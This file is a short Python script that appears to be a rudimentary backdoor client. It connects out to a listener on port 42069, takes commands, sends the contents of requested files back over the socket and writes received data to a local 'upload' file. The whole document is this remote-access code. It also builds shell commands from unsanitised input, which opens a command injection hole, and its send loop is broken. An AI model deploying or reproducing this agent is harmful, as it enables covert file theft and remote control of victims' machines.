import subprocess
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 42069))

while True:
    data = s.recv(2048).decode("utf-8")
    action = data.split(' ')[0]
    param = data.split(' ')[1]
    directory = subprocess.check_output(['pwd', '-L']).decode("utf-8").replace("\n","")
    if action == "download":
        existencePayload = "ls | grep -i " + param
        existence = subprocess.check_output(existencePayload, shell=True).decode("utf-8").replace("\n","")
        if existence != "":
            filename = directory + "/" + existence
            with open(filename, "rb") as f:
                byte = f.read()
                while byte:
                    s.send(byte)
    else:
        directory = subprocess.check_output(['pwd', '-L']).decode("utf-8").replace("\n", "")
        f = open(directory + "/upload", 'ab')
        f.write(data.encode())
        f.close()
